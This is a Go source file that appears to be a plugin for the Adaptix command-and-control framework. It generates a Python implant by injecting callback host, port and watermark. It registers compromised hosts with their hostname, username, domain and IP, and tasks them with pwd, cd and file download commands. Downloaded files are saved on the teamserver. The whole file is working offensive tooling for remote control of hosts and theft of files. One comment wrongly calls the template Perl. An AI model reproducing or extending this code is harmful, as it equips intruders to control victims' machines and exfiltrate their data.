package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// GenerateConfig holds configuration data for agent generation.
// Currently empty as agent_id is generated at runtime by the agent itself,
// not during the build process. This ensures each agent instance has a unique ID.
type GenerateConfig struct {
}

// getString is a helper function to safely extract string values from a map.
// Returns empty string if key doesn't exist or value is not a string.
func getString(m map[string]interface{}, key string) string {
	if val, ok := m[key].(string); ok {
		return val
	}
	return ""
}

// getInt is a helper function to safely extract integer values from a map.
// Handles both float64 (JSON default for numbers) and int types.
// Returns 0 if key doesn't exist or value cannot be converted.
func getInt(m map[string]interface{}, key string) int {
	if val, ok := m[key].(float64); ok {
		return int(val)
	}
	if val, ok := m[key].(int); ok {
		return val
	}
	return 0
}

// AgentGenerateProfile extracts listener configuration needed for agent generation.
// This function is called during agent build to gather connection parameters.
// Parameters:
//   - agentConfig: JSON string with agent-specific configuration (currently unused)
//   - listenerWM: Listener watermark (currently unused)
//   - listenerMap: Map containing listener configuration (callback_address, api_path, etc.)
//
// Returns: JSON-encoded profile data containing callback_addr and api_path
func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	var (
		generateConfig GenerateConfig
		err            error
	)

	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, err
	}

	/// START CODE HERE

	// Extract callback address and API path from listener
	callbackAddr, ok := listenerMap["callback_address"].(string)
	if !ok {
		return nil, errors.New("callback_address not found in listener map")
	}

	apiPath, ok := listenerMap["api_path"].(string)
	if !ok {
		return nil, errors.New("api_path not found in listener map")
	}

	// Agent generates its own ID at runtime - no need to include in profile
	profileData := map[string]string{
		"callback_addr": callbackAddr,
		"api_path":      apiPath,
	}

	profileBytes, err := json.Marshal(profileData)
	if err != nil {
		return nil, err
	}

	/// END CODE HERE

	return profileBytes, nil
}

// AgentGenerateBuild creates a deployable agent by replacing placeholders in the template.
// This function reads the Perl agent template and injects configuration values.
// Parameters:
//   - agentConfig: JSON string with agent-specific configuration
//   - agentProfile: JSON-encoded profile data from AgentGenerateProfile
//   - listenerMap: Map containing listener configuration
//
// Returns:
//   - Agent file content (Perl script with placeholders replaced)
//   - Filename for the generated agent
//   - Error if any step fails
func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	var (
		Filename     string
		buildContent []byte
	)

	/// START CODE HERE

	// Parse profile
	var profile map[string]string
	err := json.Unmarshal(agentProfile, &profile)
	if err != nil {
		return nil, "", err
	}

	callbackAddr := profile["callback_addr"]
	apiPath := profile["api_path"]

	// Parse callback address
	host, port, err := net.SplitHostPort(strings.TrimPrefix(strings.TrimPrefix(callbackAddr, "http://"), "https://"))
	if err != nil {
		return nil, "", fmt.Errorf("invalid callback address: %v", err)
	}

	// Read agent template
	currentDir := ModuleDir
	Filename = "CStesthihi.py"

	agentContentBytes, err := os.ReadFile(currentDir + "/src_CStesthihi/CStesthihi.py")
	if err != nil {
		return nil, "", err
	}

	agentContent := string(agentContentBytes)

	// Replace placeholders (agent generates its own ID at runtime)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_HOST>", host)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PORT>", port)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PATH>", apiPath)
	agentContent = strings.ReplaceAll(agentContent, "<WATERMARK>", AgentWatermark)

	buildContent = []byte(agentContent)

	/// END CODE HERE

	return buildContent, Filename, nil
}

// CreateAgent parses initial beacon data and populates agent metadata.
// Called when an agent checks in for the first time to register it in the C2.
// Parameters:
//   - initialData: JSON-encoded system information from the agent's first beacon
//
// Returns: Populated AgentData struct with system info, sleep/jitter settings, etc.
func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	var initData map[string]interface{}
	err := json.Unmarshal(initialData, &initData)
	if err != nil {
		return agentData, err
	}

	// Extract agent information
	agentData.Computer = getString(initData, "hostname")
	agentData.Username = getString(initData, "username")
	agentData.Domain = getString(initData, "domain")
	agentData.InternalIP = getString(initData, "internal_ip")
	agentData.Process = getString(initData, "process")
	agentData.Pid = fmt.Sprintf("%d", getInt(initData, "pid"))
	agentData.Sleep = uint(getInt(initData, "sleep"))
	agentData.Jitter = uint(getInt(initData, "jitter"))
	agentData.Os = OS_LINUX

	// No encryption for now
	agentData.SessionKey = []byte("NULL")

	/// END CODE

	return agentData, nil
}

// AgentEncryptData encrypts outgoing data sent to the agent.
// Currently unimplemented - returns data as-is without encryption.
// To add encryption: implement RC4, AES, or custom algorithm here.
func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return data, nil
	/// END CODE
}

// AgentDecryptData decrypts incoming data received from the agent.
// Currently unimplemented - returns data as-is without decryption.
// Must match encryption algorithm implemented in AgentEncryptData.
func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return data, nil
	/// END CODE
}

/// TASKS

// PackTasks converts Adaptix TaskData array into agent-consumable JSON format.
// Called when the agent checks in to send pending tasks for execution.
// Parameters:
//   - agentData: Agent metadata (unused but required by interface)
//   - tasksArray: Array of tasks to send to the agent
//
// Returns: JSON-encoded response with tasks array, each containing task_id and command data
func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var tasks []map[string]interface{}

	for _, task := range tasksArray {
		var taskMap map[string]interface{}
		err := json.Unmarshal(task.Data, &taskMap)
		if err != nil {
			continue
		}

		taskMap["task_id"] = task.TaskId
		tasks = append(tasks, taskMap)
	}

	response := map[string]interface{}{
		"tasks": tasks,
	}

	packData, err := json.Marshal(response)
	if err != nil {
		return nil, err
	}

	/// END CODE

	return packData, nil
}

// PackPivotTasks formats tasks for pivoted/proxied agents.
// Currently unimplemented - pivot functionality not supported.
func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
	/// START CODE HERE
	return data, nil
	/// END CODE HERE
}

// CreateTask converts user input from the UI into a task for the agent.
// Called when an operator executes a command in the Adaptix console.
// Parameters:
//   - ts: Teamserver interface for C2 operations
//   - agent: Agent metadata
//   - args: Map containing command name and parameters from UI
//
// Returns:
//   - TaskData: Serialized task to send to agent
//   - ConsoleMessageData: Message to display in operator's console
//   - Error if command is invalid or parameters are missing
func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	//command, ok := args["command"].(string)
	//if !ok {
	//	return taskData, messageData, errors.New("'command' must be set")
	//}
	//subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	subcommand, _ := args["subcommand"].(string)

	commandData := make(map[string]interface{})
	commandData["command"] = command

	switch command {
	case "pwd":
		// No additional parameters needed
	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			return taskData, messageData, err
		}
		commandData["path"] = path
	case "download":
		taskData.Type = TYPE_JOB

		path, ok := args["file"].(string)
		if !ok {
			err = errors.New("parameter 'file' must be set")
			return taskData, messageData, err
		}
		commandData["path"] = path
	// case "whoami":
	// // No parameters needed
	// // handled by execution layer

	// case "ls":
	// // Optional parameter: path
	// 	if path, ok := args["path"].(string); ok {
	// 		commandData["path"] = path
	// 	} else {
	// 		commandData["path"] = "." // default to current directory
	// 	}
	// 		default:
	// 			err = fmt.Errorf("unknown jobs subcommand: %s", subcommand)
	// 			return taskData, messageData, err
	// 		}
	default:
		err = fmt.Errorf("unknown command: %s", command)
		return taskData, messageData, err
	}

	taskData.Data, err = json.Marshal(commandData)
	if err != nil {
		return taskData, messageData, err
	}

	/// END CODE

	return taskData, messageData, err
}
// ProcessTasksResult parses agent task responses and displays formatted output.
// Called when agent sends back task execution results.
// Parameters:
//   - ts: Teamserver interface for console output
//   - agentData: Agent metadata
//   - taskData: Original task data (unused but required by interface)
//   - packedData: JSON-encoded array of task results from agent
//
// Returns: Array of additional tasks to queue (currently always empty)
func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
	var outTasks []adaptix.TaskData

	/// START CODE

	// Parse results array
	var results []map[string]interface{}
	err := json.Unmarshal(packedData, &results)
	if err != nil {
		return outTasks
	}

	// Process each result
	for _, result := range results {
		taskId := getString(result, "task_id")
		output := getString(result, "output")

		// Parse the output JSON to format it nicely
		var outputData map[string]interface{}
		err := json.Unmarshal([]byte(output), &outputData)
		if err != nil {
			// If parsing fails, just show raw output
			continue
		}

		command := getString(outputData, "command")

		// Create task object to track completion status
		// Default to TYPE_TASK, will override for jobs
		task := adaptix.TaskData{
			Type:        TYPE_TASK,
			TaskId:      taskId,
			AgentId:     agentData.Id,
			Completed:   true,
			MessageType: MESSAGE_SUCCESS,
		}

		switch command {
		case "pwd":
			path := getString(outputData, "path")
			task.Message = "Current directory:"
			task.ClearText = path
		case "cd":
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				path := getString(outputData, "path")
				task.Message = "Changed directory to:"
				task.ClearText = path
			}
		case "download":
			task.Type = TYPE_JOB

			asyncVal := getInt(outputData, "async")
			if asyncVal != 0 {
				jobId := getString(outputData, "job_id")
				pid := getInt(outputData, "pid")
				path := getString(outputData, "path")
				task.Completed = false
				task.Message = fmt.Sprintf("Downloading: %s", path)
				task.ClearText = fmt.Sprintf("Job %s (PID: %d) started in background", jobId, pid)
			} else if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Download error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				// This is completed download output from job
				path := getString(outputData, "path")
				fileId := getString(outputData, "file_id")
				sizeFloat, _ := outputData["size"].(float64)
				size := int(sizeFloat)
				contentB64 := getString(outputData, "content")

				if contentB64 == "" || size == 0 {
					task.Message = fmt.Sprintf("Download failed: %s (file not found or empty)", path)
					task.MessageType = MESSAGE_ERROR
				} else {
					// Decode base64 content
					fileContent, err := base64.StdEncoding.DecodeString(contentB64)
					if err != nil {
						task.Message = fmt.Sprintf("Error decoding downloaded file %s: %s", path, err.Error())
						task.MessageType = MESSAGE_ERROR
					} else {
						// Extract filename from path
						fileName := path
						if idx := strings.LastIndex(path, "/"); idx != -1 {
							fileName = path[idx+1:]
						}

						// Save file using C2 bindings
						err := ts.TsDownloadSave(agentData.Id, fileId, fileName, fileContent)
						if err != nil {
							task.Message = fmt.Sprintf("Error saving downloaded file %s: %s", path, err.Error())
							task.MessageType = MESSAGE_ERROR
						} else {
							task.Message = fmt.Sprintf("Download completed: %s", fileName)
							task.MessageType = MESSAGE_SUCCESS
							task.ClearText = fmt.Sprintf("Size: %d bytes\nFile ID: %s", size, fileId)
						}
					}
				}
			}
		default:
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				// Show raw JSON output for unknown commands
				jsonBytes, _ := json.MarshalIndent(outputData, "", "  ")
				task.Message = fmt.Sprintf("Command result: %s", command)
				task.ClearText = string(jsonBytes)
			}
		}

		// Add task to output array for status tracking
		outTasks = append(outTasks, task)
	}

	/// END CODE

	return outTasks
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelClose(channelId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

/// TERMINAL

func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalClose(terminalId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}
